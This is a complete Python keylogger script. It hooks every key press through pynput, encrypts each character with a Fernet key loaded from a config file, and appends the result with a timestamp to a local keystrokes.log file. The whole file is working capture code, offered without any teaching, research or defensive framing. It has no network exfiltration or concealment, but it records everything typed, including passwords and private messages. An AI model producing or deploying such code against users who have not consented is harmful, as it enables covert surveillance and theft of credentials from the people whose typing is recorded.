from pynput import keyboard
from datetime import datetime
from encrypt_util import load_key, encrypt_data
import json, os

config_path = os.path.join(os.path.dirname(__file__), 'config.json')
with open(config_path) as f:
    config = json.load(f)

fernet = load_key(config["encryption_key"])

def write_log(encrypted_data):
    logs_dir = os.path.join(os.path.dirname(__file__), "logs")
    os.makedirs(logs_dir, exist_ok=True)
    log_path = os.path.join(logs_dir, "keystrokes.log")
    with open(log_path, "a") as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"[{timestamp}] {encrypted_data}\n")

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    encrypted = encrypt_data(fernet, k)
    write_log(encrypted)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
